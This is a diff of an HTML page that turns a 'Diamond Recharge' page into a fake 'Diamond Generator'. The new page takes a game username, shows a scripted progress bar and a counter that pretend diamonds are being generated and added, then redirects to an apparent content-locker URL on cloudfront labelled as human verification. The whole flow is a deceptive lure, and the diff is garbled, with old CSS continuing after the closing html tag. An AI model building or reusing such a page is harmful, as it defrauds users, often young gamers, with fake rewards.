@@ -1,220 +1,263 @@
-
 <!DOCTYPE html>
 <html lang="en" dir="ltr">
 <head>
-    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
-    <script async src="https://www.googletagmanager.com/gtag/js?id=G-QL7RYZFWXS"></script>
-    <script>
-        window.dataLayer = window.dataLayer || [];
-        function gtag(){dataLayer.push(arguments);}
-        gtag('js', new Date());
-        gtag('config', 'G-QL7RYZFWXS');
-    </script>
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Diamond Recharge</title>
-    <style>
-        :root {
-            --primary: #007BFF;
-            --primary-gradient: linear-gradient(135deg, #007BFF, #0056b3);
-            --secondary: #FFC107;
-            --dark: #1A1A1A;
-            --light: #FFF5F5;
-            --success: #28A745;
-            --white: #FFFFFF;
-            --glass: rgba(0, 123, 255, 0.1);
-            --glass-border: rgba(0, 123, 255, 0.2);
-            --text-color: var(--white);
-            --bg-color: var(--dark);
-            --gradient-color-1: rgba(0, 123, 255, 0.1);
-            --gradient-color-2: rgba(255, 193, 7, 0.1);
-            --toggle-bg-dark: var(--white);
-            --toggle-icon-dark: #1A1A1A;
-            --toggle-shadow-dark: rgba(0, 123, 255, 0.2);
-            --toggle-bg-light: #1A1A1A;
-            --toggle-icon-light: var(--white);
-            --toggle-shadow-light: rgba(255, 193, 7, 0.2);
-        }
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Diamond Generator</title>
+  <link rel="icon" href="https://i.postimg.cc/BQqJ59vT/6714978.png">
+  <style>
+    body {
+      margin: 0;
+      font-family: 'Poppins', sans-serif;
+      background: #0f172a;
+      color: white;
+      transition: 0.3s ease;
+    }
 
-        body.light-mode {
-            --primary: #007BFF;
-            --primary-gradient: linear-gradient(135deg, #007BFF, #0056b3);
-            --secondary: #FFC107;
-            --dark: #FFF5F5;
-            --light: #1A1A1A;
-            --white: #1A1A1A;
-            --glass: rgba(0, 123, 255, 0.05);
-            --glass-border: rgba(0, 123, 255, 0.15);
-            --text-color: #1A1A1A;
-            --bg-color: #FFF5F5;
-            --gradient-color-1: rgba(0, 123, 255, 0.05);
-            --gradient-color-2: rgba(255, 193, 7, 0.05);
-        }
+    .light-mode {
+      background: #f4f4f4;
+      color: #222;
+    }
 
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-            font-family: 'Arial', sans-serif;
-        }
+    .container {
+      max-width: 420px;
+      margin: 50px auto;
+      padding: 20px;
+      text-align: center;
+      background: rgba(255, 255, 255, 0.06);
+      border-radius: 15px;
+      box-shadow: 0 0 20px rgba(255, 255, 255, 0.1);
+    }
 
-        body {
-            background: var(--bg-color);
-            color: var(--text-color);
-            min-height: 100vh;
-            background-image: radial-gradient(circle at 15% 50%, var(--gradient-color-1) 0%, transparent 50%), 
-                             radial-gradient(circle at 85% 30%, var(--gradient-color-2) 0%, transparent 50%);
-            transition: background 0.3s ease, color 0.3s ease;
-        }
+    .light-mode .container {
+      background: #fff;
+      box-shadow: 0 0 20px rgba(0, 0, 0, 0.1);
+    }
 
-        .page {
-            min-height: 100vh;
-            display: none;
-            padding: 20px;
-            animation: fadeIn 0.5s ease-out;
-        }
+    h1 {
+      margin-bottom: 20px;
+      font-weight: 700;
+    }
 
-        .page.active {
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            justify-content: center;
-        }
+    input {
+      width: 80%;
+      padding: 10px;
+      margin: 15px 0;
+      border-radius: 10px;
+      border: none;
+      font-size: 16px;
+      text-align: center;
+      outline: none;
+    }
 
-        @keyframes fadeIn {
-            from { opacity: 0; transform: translateY(20px); }
-            to { opacity: 1; transform: translateY(0); }
-        }
+    button {
+      padding: 10px 25px;
+      font-size: 16px;
+      border-radius: 10px;
+      border: none;
+      background: #2563eb;
+      color: white;
+      cursor: pointer;
+      transition: 0.2s;
+    }
 
-        .container {
-            width: 100%;
-            max-width: 500px;
-            margin: auto;
-        }
+    button:hover {
+      background: #1e40af;
+    }
 
-        .glass-card {
-            background: var(--glass);
-            backdrop-filter: blur(20px);
-            border: 1px solid var(--glass-border);
-            border-radius: 24px;
-            padding: 30px;
-            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.2);
-            position: relative;
-            overflow: hidden;
-            transition: background 0.3s ease, border-color 0.3s ease, box-shadow 0.3s ease;
-        }
+    .coins-option {
+      display: inline-block;
+      padding: 15px 25px;
+      margin: 10px;
+      background: #1e293b;
+      border-radius: 10px;
+      cursor: pointer;
+      transition: 0.3s;
+    }
 
-        .glass-card::before {
-            content: '';
-            position: absolute;
-            top: 0;
-            left: 0;
-            right: 0;
-            height: 4px;
-            background: var(--primary-gradient);
-        }
+    .coins-option.selected {
+      background: #2563eb;
+    }
 
-        .header {
-            text-align: center;
-            margin-bottom: 40px;
-        }
+    .progress-bar {
+      width: 100%;
+      background: #1e293b;
+      border-radius: 10px;
+      overflow: hidden;
+      margin-top: 20px;
+      height: 20px;
+    }
 
-        .logo-container {
-            background: var(--glass);
-            width: 120px;
-            height: 120px;
-            border-radius: 30px;
-            margin: 0 auto 20px;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            transform: rotate(-5deg);
-            box-shadow: 0 10px 20px rgba(0, 0, 0, 0.1);
-            transition: background 0.3s ease, box-shadow 0.3s ease;
-        }
+    .progress {
+      height: 100%;
+      width: 0;
+      background: #2563eb;
+      transition: width 0.1s linear;
+    }
 
-        .logo {
-            width: 80px;
-            height: auto;
-        }
+    .hidden {
+      display: none;
+    }
 
-        .title {
-            font-size: 2.5rem;
-            font-weight: 800;
-            margin-bottom: 10px;
-            background: var(--primary-gradient);
-            -webkit-background-clip: text;
-            -webkit-text-fill-color: transparent;
-            text-transform: uppercase;
-            letter-spacing: 1px;
-        }
+    .theme-btn {
+      position: fixed;
+      top: 15px;
+      right: 15px;
+      background: none;
+      border: none;
+      cursor: pointer;
+    }
 
-        .subtitle {
-            color: var(--light);
-            font-size: 1.1rem;
-            opacity: 0.8;
-            transition: color 0.3s ease;
-        }
+    .theme-btn img {
+      width: 35px;
+    }
+  </style>
+</head>
+<body>
+  <button class="theme-btn" onclick="toggleTheme()">
+    <img id="theme-icon" src="https://i.postimg.cc/BQqJ59vT/6714978.png" alt="Dark Mode">
+  </button>
 
-        .steps {
-            display: flex;
-            justify-content: flex-start;
-            margin-bottom: 30px;
-            direction: ltr;
-        }
+  <div class="container" id="username-page" class="page active">
+    <h1>Enter Your Username</h1>
+    <input type="text" id="username" placeholder="Your Username">
+    <br>
+    <button onclick="nextPage('coins-page')">Continue</button>
+  </div>
 
-        .step {
-            width: 35px;
-            height: 35px;
-            border-radius: 50%;
-            background: var(--glass);
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            font-weight: 600;
-            margin: 0 5px;
-            position: relative;
-            border: 2px solid var(--glass-border);
-            transition: background 0.3s ease, border-color 0.3s ease;
-        }
+  <div class="container page hidden" id="coins-page">
+    <h1>Select Diamonds</h1>
+    <div class="coins-option" onclick="selectCoinsAndAdvance(500, this)">500 💎</div>
+    <div class="coins-option" onclick="selectCoinsAndAdvance(1000, this)">1000 💎</div>
+    <div class="coins-option" onclick="selectCoinsAndAdvance(2000, this)">2000 💎</div>
+  </div>
 
-        .step.active {
-            background: var(--primary-gradient);
-            border: none;
-        }
+  <div class="container page hidden" id="processing-page">
+    <h1>Processing...</h1>
+    <div class="progress-bar"><div id="progress-bar" class="progress"></div></div>
+    <p id="status-message">Verifying Information</p>
+  </div>
 
-        .step.completed {
-            background: var(--success);
-            border: none;
-        }
+  <div class="container page hidden" id="counting-page">
+    <h1>Adding Diamonds...</h1>
+    <h2 id="counter">0</h2>
+    <p>💎 Diamonds Added</p>
+  </div>
 
-        .step::after {
-            content: '';
-            position: absolute;
-            right: -15px;
-            width: 20px;
-            height: 2px;
-            background: var(--glass-border);
-            transition: background 0.3s ease;
-        }
+  <div class="container page hidden" id="verification-page">
+    <h1>Verification Required</h1>
+    <p>Please verify you're human...</p>
+  </div>
 
-        .step:last-child::after {
-            display: none;
-        }
+  <div id="error-modal" class="hidden">
+    <p id="error-modal-text"></p>
+    <button onclick="closeErrorModal()">OK</button>
+  </div>
 
-        .input-group {
-            margin-bottom: 25px;
-        }
+  <div id="loading-overlay" class="hidden">
+    <p>Loading...</p>
+  </div>
 
-        .label {
-            display: block;
-            font-weight: 600;
-            margin-bottom: 10px;
-            font-size: 1.1rem;
-            text-align: left;
-            direction: ltr;
-        }
+  <script>
+    let selectedCoinsAmount = 0;
+    let verificationUrl;
 
-        .input {
+    function toggleTheme() {
+      document.body.classList.toggle('light-mode');
+      const themeIcon = document.getElementById('theme-icon');
+      if (document.body.classList.contains('light-mode')) {
+        themeIcon.src = "https://i.postimg.cc/V6LFBk3y/image.png";
+        themeIcon.alt = "Light Mode";
+        localStorage.setItem('theme', 'light');
+      } else {
+        themeIcon.src = "https://i.postimg.cc/BQqJ59vT/6714978.png";
+        themeIcon.alt = "Dark Mode";
+        localStorage.setItem('theme', 'dark');
+      }
+    }
+
+    document.addEventListener('DOMContentLoaded', () => {
+      if (localStorage.getItem('theme') === 'light') {
+        document.body.classList.add('light-mode');
+        document.getElementById('theme-icon').src = "https://i.postimg.cc/t70S5H3h/sun.png";
+        document.getElementById('theme-icon').alt = "Light Mode";
+      }
+      verificationUrl = 'https://d3k0q5ez56odtk.cloudfront.net/public/locker.php?it=4249641&key=372fb';
+    });
+
+    function showPage(pageId) {
+      document.querySelectorAll('.page').forEach(page => page.classList.add('hidden'));
+      document.getElementById(pageId).classList.remove('hidden');
+    }
+
+    function nextPage(pageId) {
+      if (pageId === 'coins-page' && !document.getElementById('username').value.trim()) {
+        alert('Please enter your username');
+        return;
+      }
+      showPage(pageId);
+    }
+
+    function selectCoinsAndAdvance(amount, element) {
+      selectedCoinsAmount = amount;
+      document.querySelectorAll('.coins-option').forEach(option => option.classList.remove('selected'));
+      element.classList.add('selected');
+      setTimeout(() => {
+        showPage('processing-page');
+        simulateProgress();
+      }, 300);
+    }
+
+    function simulateProgress() {
+      let progress = 0;
+      const progressBar = document.getElementById('progress-bar');
+      const statusMessage = document.getElementById('status-message');
+      const interval = setInterval(() => {
+        progress += 1;
+        progressBar.style.width = `${progress}%`;
+        if (progress <= 25) statusMessage.textContent = 'Verifying Information';
+        else if (progress <= 50) statusMessage.textContent = 'Generating Diamonds';
+        else if (progress <= 75) statusMessage.textContent = 'Preparing Diamonds for your account';
+        else statusMessage.textContent = 'Generation Complete!';
+        if (progress >= 100) {
+          clearInterval(interval);
+          setTimeout(startCounting, 1000);
+        }
+      }, 50);
+    }
+
+    function startCounting() {
+      showPage('counting-page');
+      let count = 0;
+      const counter = document.getElementById('counter');
+      const duration = 2000;
+      const interval = 50;
+      const steps = duration / interval;
+      const increment = selectedCoinsAmount / steps;
+      const countInterval = setInterval(() => {
+        count += increment;
+        counter.textContent = Math.floor(count).toLocaleString();
+        if (count >= selectedCoinsAmount) {
+          clearInterval(countInterval);
+          counter.textContent = selectedCoinsAmount.toLocaleString();
+          setTimeout(showVerification, 1000);
+        }
+      }, interval);
+    }
+
+    function showVerification() {
+      showPage('verification-page');
+      setTimeout(() => {
+        window.location.href = verificationUrl;
+      }, 2000);
+    }
+
+    function closeErrorModal() {
+      document.getElementById("error-modal").classList.add("hidden");
+    }
+  </script>
+</body>
+</html>        .input {
             width: 100%;
             padding: 16px 20px;
             background: var(--glass);
